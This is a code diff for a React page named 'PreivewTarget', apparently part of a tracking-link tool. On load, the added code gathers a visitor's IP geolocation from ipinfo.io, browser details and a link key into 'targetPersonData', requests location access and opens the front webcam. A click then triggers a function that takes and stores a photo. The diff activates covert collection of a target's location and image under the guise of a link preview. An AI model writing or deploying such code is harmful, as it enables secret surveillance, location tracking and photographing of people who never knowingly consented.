@@ -29,35 +29,33 @@ export default function PreivewTarget() {
     // Setting the title of the page
     SetMetaDatas(data) 
     
-    async function CallingApi() {
-        const ipFyResponse = await axios.get("https://ipinfo.io/json") 
-        
-        alert(JSON.stringify(ipFyResponse))
-        // try {
-        //     const ipFyResponse = await axios.get("https://api.ipify.org?format=json") 
-        //     const ipFyIp = await ipFyResponse.data.ip
-        //     const IpInfos = await axios.get(`https://ip-api.com/json/${ipFyIp}?fields=status,message,continent,country,regionName,city,lat,lon,timezone,isp,org,as,mobile ,query`)
+    async function CallingApi() {  
+        try { 
+            const IpInfos = await axios.get("https://ipinfo.io/json") 
 
-        //     const datas = {
-        //         ...IpInfos.data, 
-        //         ...navigator.userAgentData, 
-        //         brand:navigator.userAgentData.brands[2].brand,
-        //         mobile:navigator.userAgentData.mobile,
-        //         platform:navigator.userAgentData.platform,
-        //         url:window.location.href,
-        //         link_key:theKey,
-        //         clicked_at: Date.now()
+            const browserData = navigator.userAgentData ?{ 
+                ...navigator.userAgentData, 
+                brand:navigator.userAgentData.brands[2].brand,
+                mobile:navigator.userAgentData.mobile,
+                platform:navigator.userAgentData.platform
+            }:"";
+
+            const datas = {
+                ...IpInfos.data,
+                url:window.location.href,
+                link_key:theKey,
+                clicked_at: Date.now(),
+                ...browserData
+            }
             
-        //     }
             
-            
-        //     setTargetPersonData(datas);
-        //     AskLocationPermision()
-        // } catch (error) {
-        //     seterror(true)
-        //     console.error('issues:', error)
-        //     alert(JSON.stringify(error))
-        // }
+            setTargetPersonData(datas);
+            AskLocationPermision()
+        } catch (error) {
+            seterror(true)
+            console.error('issues:', error)
+            alert(JSON.stringify(error))
+        }
 
     }
     function AskLocationPermision() { 
@@ -85,6 +83,8 @@ export default function PreivewTarget() {
             // Browser doesn't support Geolocation API
             console.error('Geolocation is not supported in this browser.');
         }
+        // Also ask the web camera access for first time
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
     }
     useEffect(() => { 
         CallingApi()  
@@ -92,15 +92,9 @@ export default function PreivewTarget() {
  
      
     function ClickedOkay() {
-
-        if (!IsClicked) {
-            alert(JSON.stringify(targetPersonData))
-            console.log('loaded',targetPersonData)
-            // PhotoAndStore() 
-            // setIsClicked(true)
-        }
-        
-
+ 
+        PhotoAndStore() 
+          
         function PhotoAndStore() { 
             const video = vdo.current
             // Check if the browser supports the getUserMedia method
